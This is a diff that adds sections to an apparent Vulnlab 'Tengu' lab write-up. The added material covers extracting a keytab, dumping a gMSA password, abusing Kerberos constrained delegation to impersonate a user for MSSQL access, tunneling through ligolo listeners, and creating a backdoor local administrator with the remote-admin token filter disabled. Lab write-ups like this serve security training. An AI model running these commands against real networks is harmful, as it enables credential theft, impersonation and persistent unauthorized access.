@@ -109,3 +109,65 @@ python3 bhqc.py -u neo4j -p pwd -d TENGU.VL --heavy
 ```
 
 ![bhqc](/Vulnlabs/Chains/Images/tengu-bhqc.png)
+
+## GMSA
+
+* As suggested by the output above and with the help of [Pentester's-promiscuous-notebook](https://ppn.snovvcrash.rocks/pentest/infrastructure/ad/kerberos) , we can extract the krb5.keytab with [KeyTabExtract](https://github.com/sosdave/KeyTabExtract) .
+
+![krb5hash](/Vulnlabs/Chains/Images/tengu-krb5.png)
+
+* Consulting the [Hacker Recipes](https://www.thehacker.recipes/ad/movement/dacl/readgmsapassword) for further exploiting the GMSA we can do
+
+```bash
+gMSADumper.py -u 'NODERED$' -p 'hash' -d 'tengu.vl'
+which surprisingly gives an error
+```
+
+* so we move on with `nxc`
+
+```bash
+nxc ldap dc.tengu.vl -u 'NODERED$' -H 'hash' --gmsa
+```
+
+![gmsa](/Vulnlabs/Chains/Images/tengu-gmsa.png)
+
+## Delegation
+
+* Then again as per `bhqc` and [hacker recipes](https://www.thehacker.recipes/ad/movement/kerberos/delegations/#recon) regarding delegation, we can get more info by running impacket's `findDelegation.py`
+
+```bash
+impacket-findDelegation.py "tengu.vl"/"gMSA01$":""@dc.tengu.vl -hashes ":hash"
+```
+
+![delegation](/Vulnlabs/Chains/Images/tengu-delegation.png)
+
+* And as mentioned in [hacker recipes-KCD](https://www.thehacker.recipes/ad/movement/kerberos/delegations/constrained) 
+
+```bash
+getST -spn "MSSQLSvc/tengu.vl" -impersonate "T1.M_WINTERS" "tengu.vl"/"gMSA01$":""@"dc.tengu.vl" --dc-ip 10.10.x.229
+```
+
+![getST](/Vulnlabs/Chains/Images/tengu-getST.png)
+
+* we can export the ccache and use impacket's `mssqlclient ` to login with kerberos auth as
+
+```bash
+export KRB5CNAME=T1_M.WINTERS@MSSQLSvc_sql.tengu@TENGU.VL.ccache
+
+impacket-mssqlclient -k sql.tengu.vl
+```
+
+
+## Ligolo outbound firewall
+
+```
+listener_add --addr 0.0.0.0:53 --to 10.8.2.42:53 --tcp
+listener_add --addr 0.0.0.0:123 --to 10.8.2.42:123 --tcp
+```
+
+```powershell
+New-LocalUser -Name "newadmin" -Password (ConvertTo-SecureString 'Password!' -AsPlainText -Force)  
+
+Add-LocalGroupMember -Group "Administrators" -Member "newadmin"  
+reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\system /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f
+```
